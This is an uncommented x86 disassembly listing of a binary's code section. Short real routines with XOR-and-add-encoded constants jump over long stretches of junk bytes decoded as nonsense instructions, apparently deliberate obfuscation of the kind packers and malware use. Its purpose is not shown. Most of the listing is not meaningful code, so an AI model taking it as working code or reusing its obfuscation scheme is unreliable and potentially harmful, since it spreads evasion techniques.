  4059fe:	rep stos BYTE PTR es:[edi],al
  405a00:	popf   
  405a01:	and    ch,BYTE PTR [eax-0x1ac98ca4]
  405a07:	or     BYTE PTR [edx+0x6a],ch
  405a0a:	inc    edx
  405a0b:	lods   eax,DWORD PTR ds:[esi]
  405a0c:	and    ah,BYTE PTR [si-0x7e]
  405a10:	dec    ecx
  405a11:	test   DWORD PTR [ebx+edi*1],eax
  405a14:	out    dx,eax
  405a15:	and    DWORD PTR ds:0xdf3421ae,esi
  405a1b:	pushf  
  405a1c:	push   es
  405a1d:	mov    dh,0x78
  405a1f:	mov    al,ds:0xb8c773d4
  405a24:	gs dec edx
  405a26:	fimul  DWORD PTR [edi+0x6b]
  405a29:	xchg   esi,eax
  405a2a:	cmp    al,0x46
  405a2c:	pop    ds
  405a2d:	inc    ax
  405a2f:	cmp    dh,BYTE PTR [edi]
  405a31:	rcr    DWORD PTR [esi+0xe],cl
  405a34:	and    al,0x85
  405a36:	mov    bl,0xe
  405a38:	fcmovnb st,st(4)
  405a3a:	js     0x405a5e
  405a3c:	push   edi
  405a3d:	jnp    0x405a95
  405a3f:	repnz mov ebp,0x47478b39
  405a45:	xlat   BYTE PTR gs:[ebx]
  405a47:	push   eax
  405a48:	sbb    eax,0x86c59c1
  405a4d:	mov    bh,0x99
  405a4f:	fcmovb st,st(7)
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fd71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fd71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fd71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fd71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fd71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e35b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fd59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fd59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fd59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e5b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fd59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fd59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fd51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e777,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xe07b624d
  405b88:	(bad)  
  405b89:	sbb    eax,0x70703284
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bca
  405b93:	add    DWORD PTR ds:0xcc911550,0x6b886f60
  405b9d:	jo     0x405b72
  405b9f:	jo     0x405b3a
  405ba1:	cmp    eax,0x6277d4e3
  405ba6:	nop
  405ba7:	push   eax
  405ba8:	test   eax,0x3cec079c
  405bad:	outs   dx,DWORD PTR ds:[esi]
  405bae:	add    eax,0x200428d4
  405bb3:	into   
  405bb4:	dec    esp
  405bb5:	add    eax,0x391b7df5
  405bba:	fcmovnu st,st(5)
  405bbc:	mov    ds,WORD PTR [edx+0x3eb20f57]
  405bc2:	clc    
  405bc3:	xchg   edx,eax
  405bc4:	push   edi
  405bc5:	out    0x67,eax
  405bc7:	add    ecx,DWORD PTR [edi]
  405bc9:	lds    eax,FWORD PTR [edi+0xfe9c731]
  405bcf:	int3   
  405bd0:	(bad)  
  405bd1:	pop    edx
  405bd2:	retf   0x5ce9
  405bd5:	lea    esp,[edi+0x6bcad179]
  405bdb:	xchg   BYTE PTR [ecx-0x2b41f385],bh
  405be1:	jb     0x405c33
  405be3:	pusha  
  405be4:	jo     0x405c4b
  405be6:	test   eax,0x8203c9ac
  405beb:	mov    ch,0xb6
  405bed:	mov    ebx,0xee70e
  405bf2:	xchg   esi,eax
  405bf3:	ret    
  405bf4:	mov    edx,0xf7e13aea
  405bf9:	(bad)  [esi+0x43ab8b88]
  405bff:	popa   
  405c00:	call   0x94346a3e
  405c05:	and    BYTE PTR [ebp+0x35aab84d],0x3d
  405c0c:	add    eax,0x193595e6
  405c11:	mov    eax,fs
  405c13:	jne    0x405c7b
  405c15:	sahf   
  405c16:	pop    ebx
  405c17:	(bad)  
  405c18:	scas   eax,DWORD PTR es:[edi]
  405c19:	add    eax,0xa842080d
  405c1e:	(bad)  
  405c1f:	lea    ebx,[eax+0x3ee3a3b7]
  405c25:	inc    esi
  405c26:	sbb    dh,bh
  405c28:	sub    dl,BYTE PTR [edi]
  405c2a:	(bad)  
  405c2b:	stos   BYTE PTR es:[edi],al
  405c2c:	(bad)  
  405c2d:	cmc    
  405c2e:	stos   BYTE PTR es:[edi],al
  405c2f:	dec    esi
  405c30:	bound  ecx,QWORD PTR [eax]
  405c32:	adc    al,0x9
  405c34:	pusha  
  405c35:	jmp    0xa641ee0b
  405c3a:	clc    
  405c3b:	inc    esi
  405c3c:	and    eax,0x4abe5bf1
  405c41:	xlat   BYTE PTR ss:[ebx]
  405c43:	addr16 aaa 
  405c45:	cli    
  405c46:	xor    cl,cl
  405c48:	lea    esp,[edx+0x7af8e106]
  405c4e:	adc    DWORD PTR [edx-0xc],0x4deb2894
  405c55:	scas   eax,DWORD PTR es:[edi]
  405c56:	sahf   
  405c57:	jno    0x405c78
  405c59:	push   edx
  405c5a:	or     DWORD PTR es:[ecx+0x21],ecx
  405c5e:	cdq    
  405c5f:	scas   eax,DWORD PTR es:[edi]
  405c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c61:	lock pop es
  405c63:	inc    eax
  405c64:	sar    esp,cl
  405c66:	and    ch,BYTE PTR cs:[eax]
  405c69:	jb     0x405cb9
  405c6b:	mov    ecx,DWORD PTR [esp+edx*2]
  405c6e:	mov    ebp,0x38fabcf5
  405c73:	aam    0x20
  405c75:	jge    0x405c70
  405c77:	mov    WORD PTR [eax+0x36],?
  405c7a:	xchg   esp,eax
  405c7b:	push   0xffffff83
  405c7d:	and    BYTE PTR [ebx+0x6f],0x27
  405c81:	nop
  405c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c83:	(bad)  
  405c84:	loope  0x405c56
  405c86:	vpxor  xmm4,xmm5,xmm2
  405c8a:	dec    ecx
  405c8b:	dec    eax
  405c8c:	dec    edx
  405c8d:	xor    al,0xa3
  405c8f:	int    0xa3
  405c91:	aad    0x63
  405c93:	les    esi,FWORD PTR [ebx]
  405c95:	mov    esp,0x1810ab6
  405c9a:	xchg   ebx,eax
  405c9b:	popa   
  405c9c:	sar    BYTE PTR [ebx-0x293e52df],1
  405ca2:	jns    0x405cf5
  405ca4:	loope  0x405d24
  405ca6:	cmp    ebx,ebp
  405ca8:	je     0x405cdc
  405caa:	dec    ecx
  405cab:	xor    DWORD PTR [eax],0xffffffcc
  405cae:	xor    eax,0x3758b28f
  405cb3:	fst    QWORD PTR [edx-0x3c]
  405cb6:	hlt    
  405cb7:	jge    0x405c4b
  405cb9:	mov    al,0x51
  405cbb:	call   0xf0a8:0x965a1691
  405cc2:	int    0xe5
  405cc4:	enter  0xac12,0x19
  405cc8:	imul   ebp,DWORD PTR ss:[ebp-0x42141ca4],0x909639e5
  405cd3:	into   
  405cd4:	lea    ebx,[ebx]
  405cd6:	mov    ebp,0xaf575478
  405cdb:	sbb    bh,BYTE PTR [ebx]
  405cdd:	mov    ebp,0xd47c7aec
  405ce2:	in     al,dx
  405ce3:	enter  0xa3ed,0xa4
  405ce7:	mov    ch,0xb9
  405ce9:	mov    ds:0x82eec2a2,eax
  405cee:	sub    BYTE PTR [esi+0x33e8a481],dl
  405cf4:	inc    edx
  405cf5:	test   eax,0x1f004986
  405cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cfb:	jae    0x405d4b
  405cfd:	push   0x7733cf0d
  405d02:	lock sbb eax,DWORD PTR [esi]
  405d05:	pop    ebp
  405d06:	je     0x405d16
  405d08:	hlt    
  405d09:	dec    ecx
  405d0a:	jae    0x405d74
  405d0c:	push   edi
  405d0d:	mov    ecx,DWORD PTR [esi+edx*8-0x14]
  405d11:	ja     0x405ceb
  405d13:	mov    BYTE PTR [eax],0x58
  405d16:	(bad)  
  405d17:	aad    0x0
  405d19:	in     al,0x7e
  405d1b:	mov    bh,0xc9
  405d1d:	mov    esp,0xb538b3f3
  405d22:	icebp  
  405d23:	fmul   QWORD PTR [esi-0x4a]
  405d26:	jmp    0x5795453
  405d2b:	mov    ebp,0xf94f905a
  405d30:	adc    al,0x74
  405d32:	and    DWORD PTR [edi-0x4d],0xbb95aa9e
  405d39:	pop    es
  405d3a:	cwde   
  405d3b:	ret    0x22b
  405d3e:	cmp    ecx,DWORD PTR [ecx-0x7e142a3c]
  405d44:	jo     0x405d36
  405d46:	fild   QWORD PTR [ecx+0x31]
  405d49:	loope  0x405d45
  405d4b:	js     0x405d77
  405d4d:	out    dx,eax
  405d4e:	and    cl,BYTE PTR [ebp+edx*2-0x7e148a3b]
  405d55:	pop    eax
  405d56:	jmp    0xfdef24b4
  405d5b:	mov    edx,0x7c1cd9c7
  405d60:	adc    DWORD PTR [ecx],esi
  405d62:	mov    edi,0x9b4d52f8
  405d67:	xor    BYTE PTR [edx],al
  405d69:	cli    
  405d6a:	xchg   edi,eax
  405d6b:	adc    DWORD PTR [ecx+0x27f4e943],edx
  405d71:	xchg   esp,eax
  405d72:	ins    DWORD PTR es:[edi],dx
  405d73:	or     ebx,esp
  405d75:	scas   eax,DWORD PTR es:[edi]
  405d76:	adc    edi,0x28
  405d79:	pop    ebp
  405d7a:	add    al,0x3b
  405d7c:	sahf   
  405d7d:	sub    al,BYTE PTR [edx-0x3de7b68f]
  405d83:	pop    edi
  405d84:	push   edx
  405d85:	jns    0x405def
  405d87:	dec    ebp
  405d88:	cld    
  405d89:	es pop ecx
  405d8b:	mul    BYTE PTR [esi-0x18]
  405d8e:	pop    ebx
  405d8f:	or     al,0xcb
  405d91:	adc    edi,0xac1ec962
  405d97:	sahf   
  405d98:	mov    esi,0x17e7a576
  405d9d:	outs   dx,DWORD PTR ds:[esi]
  405d9e:	hlt    
  405d9f:	arpl   WORD PTR [eax-0x16649c8d],sp
  405da5:	push   ebx
  405da6:	xchg   ecx,eax
  405da7:	jb     0x405da9
  405da9:	add    bh,cl
  405dab:	int    0x66
  405dad:	into   
  405dae:	and    al,0x79
  405db0:	dec    edx
  405db1:	std    
  405db2:	(bad)  
  405db3:	xchg   edx,eax
  405db4:	inc    esp
  405db5:	ret    
  405db6:	pop    eax
  405db7:	(bad)  
  405db8:	mov    esp,0x37145f0d
  405dbd:	test   BYTE PTR [eax+eiz*2],al
  405dc0:	xor    BYTE PTR [esi+0x50],0x11
  405dc4:	fcom   QWORD PTR [ebx-0xa]
  405dc7:	rcl    BYTE PTR [eax-0x170a475b],0x67
  405dce:	scas   al,BYTE PTR es:[edi]
  405dcf:	cmp    DWORD PTR [ebx+0x20],ecx
  405dd2:	xchg   esi,eax
  405dd3:	adc    al,0xea
  405dd5:	and    eax,0xf792cc1f
  405dda:	push   ecx
  405ddb:	xor    eax,0x38980587
  405de0:	pop    ebx
  405de1:	mov    dh,0x18
  405de3:	mov    bh,BYTE PTR [ebp+0x6]
  405de6:	xchg   esp,eax
  405de7:	out    0xa7,al
  405de9:	sbb    DWORD PTR [ecx],0xffffffaa
  405dec:	(bad)  
  405ded:	es fxam 
  405df0:	sbb    DWORD PTR [ebp+0x18],ebx
  405df3:	mov    ebp,0xdc64e88a
  405df8:	pushf  
  405df9:	dec    ebx
  405dfa:	add    ecx,DWORD PTR [ecx+0x1d370e09]
  405e00:	mov    edx,0xb94bc0b4
  405e05:	retf   0x7b79
  405e08:	mov    bl,0xf
  405e0a:	lock into 
  405e0c:	pop    ebp
  405e0d:	int3   
  405e0e:	das    
  405e0f:	jmp    0x405deb
  405e11:	pop    ds
  405e12:	fs dec esp
  405e14:	adc    cl,bl
  405e16:	lods   al,BYTE PTR ds:[esi]
  405e17:	jne    0x405e04
  405e19:	adc    eax,0x2e652f53
  405e1e:	aam    0xf6
  405e20:	daa    
  405e21:	or     eax,0x56095767
  405e26:	inc    ebp
  405e27:	mov    edi,0xfb1d1761
  405e2c:	and    al,BYTE PTR [ecx-0x71]
  405e2f:	mov    eax,ds:0x50ed9a35
  405e34:	and    eax,0x3b3e7a76
  405e39:	aad    0x3a
  405e3b:	outs   dx,BYTE PTR ds:[esi]
  405e3c:	jb     0x405e5e
  405e3e:	jl     0x405ea3
  405e40:	xor    ebx,DWORD PTR [ecx+eiz*4]
  405e43:	push   esi
  405e44:	loopne 0x405de5
  405e46:	jecxz  0x405e76
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e78f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e76f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x5f
  405ea8:	xor    ecx,DWORD PTR [ebx+0x703f3e5c]
  405eae:	jo     0x405e57
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eb0
  405eb4:	cs test eax,0xea904989
  405eba:	xor    al,0x8a
  405ebc:	mov    esi,0x4fab2b45
  405ec1:	popf   
  405ec2:	sahf   
  405ec3:	sti    
  405ec4:	(bad)  
  405ec5:	dec    ecx
  405ec6:	out    0x27,eax
  405ec8:	fbld   TBYTE PTR [ebx+ebx*1+0x5d]
  405ecc:	add    ecx,DWORD PTR [esi-0x2e]
  405ecf:	aad    0x4f
  405ed1:	adc    ebp,DWORD PTR [ebx+0x79]
  405ed4:	push   esi
  405ed5:	and    DWORD PTR [ecx-0x31],esp
  405ed8:	in     al,0xa9
  405eda:	daa    
  405edb:	adc    BYTE PTR [esp+eax*1-0x47],dl
  405edf:	jmp    0x27958703
  405ee4:	and    BYTE PTR [esi-0x47],bh
  405ee7:	outs   dx,DWORD PTR ds:[esi]
  405ee8:	pop    ebx
  405ee9:	ficomp DWORD PTR [ecx+0x9060d21]
  405eef:	add    eax,0x4b0d5521
  405ef4:	adc    al,0xd6
  405ef6:	push   ss
  405ef7:	jp     0x405ead
  405ef9:	jg     0x405f49
  405efb:	lea    edi,[ebx-0x3]
  405efe:	dec    ecx
  405eff:	inc    ebp
  405f00:	test   al,0xf
  405f02:	outs   dx,BYTE PTR ds:[esi]
  405f03:	loope  0x405f2e
  405f05:	sub    al,0x79
  405f07:	jl     0x405f25
  405f09:	mov    ebx,0x3ced1c81
  405f0e:	sub    al,0x1a
  405f10:	je     0x405f1d
  405f12:	pop    edx
  405f13:	push   ebp
  405f14:	(bad)  
  405f16:	rcr    BYTE PTR [edi],cl
  405f18:	fs cmp cl,ah
  405f1b:	add    eax,0xdcac22a4
  405f20:	out    dx,eax
  405f21:	ret    
  405f22:	pop    ebp
  405f23:	cmc    
  405f24:	sbb    BYTE PTR [ebx-0x1a64ac10],ah
  405f2a:	inc    DWORD PTR [edx+0x78cfbd63]
  405f30:	out    dx,al
  405f31:	mov    dh,0x2d
  405f33:	xchg   edi,eax
  405f34:	shl    DWORD PTR [ecx-0x6],1
  405f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f38:	mov    edi,0x7547de6b
  405f3d:	cmp    BYTE PTR [ebx],ch
  405f3f:	sbb    DWORD PTR [edi+0x2],esi
  405f42:	sbb    esp,ebp
  405f44:	mov    edx,0x8405d16a
  405f49:	(bad)  
  405f4a:	push   ebx
  405f4b:	outs   dx,DWORD PTR ds:[esi]
  405f4c:	jns    0x405f50
  405f4e:	cmp    DWORD PTR [edx],ebp
  405f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f51:	imul   esi,DWORD PTR [esi],0x5b83ae03
  405f57:	xchg   edi,eax
  405f58:	add    al,0x77
  405f5a:	aad    0xe7
  405f5c:	test   al,0x88
  405f5e:	xchg   edx,eax
  405f5f:	xchg   edx,eax
  405f60:	dec    edi
  405f61:	xor    DWORD PTR [ecx],0x4786d42e
  405f67:	xlat   BYTE PTR fs:[ebx]
  405f69:	inc    ebp
  405f6a:	mov    al,0x41
  405f6c:	pop    esp
  405f6d:	xor    al,0x16
  405f6f:	pop    ebp
  405f70:	aaa    
  405f71:	dec    ebx
  405f72:	push   esi
  405f73:	(bad)  
  405f74:	xlat   BYTE PTR ds:[ebx]
  405f75:	cdq    
  405f76:	pushf  
  405f77:	in     al,0x8e
  405f79:	add    ebp,esp
  405f7b:	sub    esp,DWORD PTR [ecx+ebx*4-0x283892b4]
  405f82:	or     ch,BYTE PTR [edi-0x77]
  405f85:	out    0xa5,al
  405f87:	cmc    
  405f88:	jbe    0x405f98
  405f8a:	aad    0xb
  405f8c:	xor    BYTE PTR [edx+edi*8-0xb34ad7d],bh
  405f93:	call   ebp
  405f95:	repnz mov cl,0x6
  405f98:	xchg   edi,eax
  405f99:	push   ds
  405f9a:	cld    
  405f9b:	cmc    
  405f9c:	mov    ds,edx
  405f9e:	lods   al,BYTE PTR ds:[esi]
  405f9f:	(bad)
  405fa4:	pop    esp
  405fa5:	inc    esp
  405fa6:	push   ecx
  405fa7:	iret   
  405fa8:	je     0x405fec
  405faa:	mov    BYTE PTR [edx-0x18],ah
  405fad:	ss imul esp,esp,0xfffffff8
  405fb1:	pop    es
  405fb2:	cmc    
  405fb3:	fild   QWORD PTR ds:0x9688b454
  405fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fba:	icebp  
  405fbb:	mov    ch,0x73
  405fbd:	ins    BYTE PTR es:[edi],dx
  405fbe:	adc    dh,BYTE PTR ds:0x7b2bbd6f
  405fc4:	in     al,0x10
  405fc6:	sub    al,BYTE PTR [edi]
  405fc8:	sar    DWORD PTR [ebx-0x4c437975],0x37
  405fcf:	sub    BYTE PTR [ebx+0x3b],dh
  405fd2:	mov    esp,0x318fd4cc
  405fd7:	inc    ebp
  405fd8:	out    0xd5,al
  405fda:	loopne 0x40605a
  405fdc:	sub    eax,0xe91383f5
  405fe1:	adc    DWORD PTR [esi+0x1b],esi
  405fe4:	lods   eax,DWORD PTR ds:[esi]
  405fe5:	rcr    DWORD PTR [ebp+0x3201d84b],0x7e
  405fec:	push   cs
  405fed:	imul   al
  405fef:	pop    ss
  405ff0:	and    BYTE PTR [edx+edi*2-0x3f],bl
  405ff4:	xor    dh,bl
  405ff6:	mov    dl,0x81
  405ff8:	test   al,0x84
  405ffa:	sbb    eax,0xd92421ba
  405fff:	popa   
  406000:	jp     0x40606f
  406002:	sbb    cl,ch
  406004:	sub    DWORD PTR [ecx*2-0x1a04610a],edx
  40600b:	inc    ebx
  40600c:	and    DWORD PTR [esi+0x7d],ecx
  40600f:	(bad)  
  406010:	loopne 0x405fb6
  406012:	push   ds
  406013:	sbb    al,0x31
  406015:	push   0xc25a11c8
  40601a:	adc    edx,DWORD PTR [edx-0x39ef2e00]
  406020:	push   ss
  406021:	nop
  406022:	out    0x60,al
  406024:	cwde   
  406025:	push   edi
  406026:	and    BYTE PTR ds:0xc01bdbbd,bl
  40602c:	add    al,0x95
  40602e:	(bad)  
  40602f:	cmp    edi,DWORD PTR [eax-0x49]
  406032:	pop    esp
  406033:	adc    eax,0x42dffe5
  406038:	dec    edx
  406039:	sub    esp,DWORD PTR [ebp-0x25453fe0]
  40603f:	jbe    0x405fce
  406041:	sbb    dl,bl
  406043:	sub    BYTE PTR [edx-0x157ace49],bh
  406049:	sub    DWORD PTR [esp+esi*1-0x4a],0x5c
  40604e:	in     al,0x88
  406050:	push   0xf51602b9
  406055:	or     eax,0x64c1025b
  40605a:	ds push es
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fe06,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e198
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fdf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fd71,0x42e19c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fd51,0x42e77b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fd55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xee1f4a96
  4060dc:	jns    0x406143
  4060de:	ds jo  0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406122
  4060e6:	mov    eax,ds:0x754cd1d0
  4060eb:	jb     0x40610a
  4060ed:	sbb    DWORD PTR [ecx+0x28],0x55667e8
  4060f4:	jae    0x4060d1
  4060f6:	es cs and al,0xcb
  4060fa:	test   al,0xe8
  4060fc:	adc    eax,0x96c9a9a7
  406101:	inc    ecx
  406102:	mov    DWORD PTR [esi+eax*8+0x3f],esi
  406106:	sbb    ebp,edi
  406108:	hlt    
  406109:	sbb    al,0x10
  40610b:	cmp    eax,edx
  40610d:	in     eax,0xfc
  40610f:	jg     0x4060b0
  406111:	mov    esi,0xa1af4800
  406116:	mov    bh,0xfc
  406118:	arpl   cx,sp
  40611a:	fsubr  QWORD PTR [ebx+ecx*4-0xc922b3b]
  406121:	je     0x406151
  406123:	adc    al,0xa5
  406125:	repnz xlat BYTE PTR ds:[ebx]
  406127:	jp     0x406158
  406129:	ja     0x406158
  40612b:	rcr    BYTE PTR ds:0x39a617aa,0xdd
  406132:	cli    
  406133:	add    esp,ecx
  406135:	push   esi
  406136:	loopne 0x406168
  406138:	jae    0x4060bc
  40613a:	(bad)  
  40613b:	leave  
  40613c:	adc    eax,0x7e396e9b
  406141:	popa   
  406142:	mov    esp,0xf6bb8d10
  406147:	inc    eax
  406148:	out    0x1b,al
  40614a:	out    0x65,al
  40614c:	sub    eax,0x843268c7
  406151:	jp     0x40617a
  406153:	test   BYTE PTR [ebx],0xb0
  406156:	dec    eax
  406157:	retf   
  406158:	pop    ebx
  406159:	sbb    eax,0x5c1f6f32
  40615e:	push   ds
  40615f:	fild   WORD PTR [edi+0x3b5d86d9]
  406165:	ret    0x9920
  406168:	adc    al,0xf3
  40616a:	mov    bh,0x51
  40616c:	xor    ecx,esp
  40616e:	lods   al,BYTE PTR ds:[esi]
  40616f:	push   ebp
  406170:	mov    WORD PTR [ebx+0x6b],?
  406173:	out    dx,al
  406174:	dec    ebp
  406175:	or     al,0xeb
  406177:	in     ax,0x34
  40617a:	test   eax,0xbdbf72d8
  40617f:	jp     0x406177
  406181:	test   DWORD PTR [edx-0x42],edx
  406184:	out    dx,eax
  406185:	mov    cs,WORD PTR [ebp+edx*4+0x55]
  406189:	cmp    BYTE PTR [edx-0x1e],ch
  40618c:	push   ebx
  40618d:	sbb    al,0x66
  40618f:	test   al,0x2e
  406191:	mov    bh,0x1c
  406193:	add    dl,bh
  406195:	push   cs
  406196:	adc    eax,0x625c72ab
  40619b:	into   
  40619c:	aam    0xb5
  40619e:	daa    
  40619f:	int    0x1d
  4061a1:	inc    edi
  4061a2:	adc    BYTE PTR [edi-0x55],0x19
  4061a6:	mov    ds:0xce158dd,al
  4061ab:	sub    eax,0x8d66d6f
  4061b0:	clc    
  4061b1:	out    dx,eax
  4061b2:	mov    ds:0x5848b574,eax
  4061b7:	in     al,dx
  4061b8:	jmp    0xda53e704
  4061bd:	scas   al,BYTE PTR es:[edi]
  4061be:	xchg   edx,eax
  4061bf:	test   BYTE PTR [edx+0x1d],0xfa
  4061c3:	cmp    al,BYTE PTR [ebx+0x361c916d]
  4061c9:	fimul  WORD PTR [ebp+edx*4+0x34dfafcf]
  4061d0:	(bad)  
  4061d1:	fcmovu st,st(5)
  4061d3:	in     al,dx
  4061d4:	into   
  4061d5:	aas    
  4061d6:	mov    ebx,esp
  4061d8:	add    ch,BYTE PTR [edi-0x5d]
  4061db:	in     al,0x6b
  4061dd:	mov    cl,0x32
  4061df:	push   esi
  4061e0:	mov    WORD PTR [edi+0x7f],ds
  4061e3:	nop
  4061e4:	in     eax,0xa4
  4061e6:	mov    ds:0x42ccb6bf,al
  4061eb:	rol    DWORD PTR [ecx-0x49],cl
  4061ee:	add    al,0x1d
  4061f0:	xor    DWORD PTR [edx+0x533acd88],ecx
  4061f6:	add    eax,0xb3c3a675
  4061fb:	mov    cl,0x97
  4061fd:	inc    esi
  4061fe:	push   ecx
  4061ff:	sti    
  406200:	rcr    BYTE PTR [ecx+ecx*2],cl
  406203:	jl     0x4061fd
  406205:	or     bh,BYTE PTR [esi]
  406207:	rcl    ebp,0x9
  40620a:	mov    ch,BYTE PTR [edx-0x17]
  40620d:	push   0xe3297a36
  406212:	out    dx,eax
  406213:	sub    DWORD PTR [edi+0x5e],esp
  406216:	sub    ebx,DWORD PTR [esi-0x30]
  406219:	add    ah,BYTE PTR [edi-0x7dbfa52f]
  40621f:	je     0x4061ec
  406221:	ins    BYTE PTR es:[edi],dx
  406222:	sub    eax,0x8653f308
  406227:	(bad)  
  406228:	lods   al,BYTE PTR ds:[esi]
  406229:	cli    
  40622a:	scas   al,BYTE PTR es:[edi]
  40622b:	loop   0x406225
  40622d:	les    edx,FWORD PTR [ebx+0x66]
  406230:	hlt    
  406231:	ret    
  406232:	push   esi
  406233:	ret    0xe9f5
  406236:	cmp    BYTE PTR [edx],bl
  406238:	ins    DWORD PTR es:[edi],dx
  406239:	ins    BYTE PTR es:[edi],dx
  40623a:	pop    ds
  40623b:	jge    0x4061dd
  40623d:	mov    esi,0x9b01f9e3
  406242:	mov    ebp,0x847678e5
  406247:	repz fistp WORD PTR [eax+0x18e44dd6]
  40624e:	in     eax,0x33
  406250:	add    BYTE PTR [edi+0x2f8ab763],cl
  406256:	mov    edx,0xee09c853
  40625b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625c:	addr16 push ecx
  40625e:	cdq    
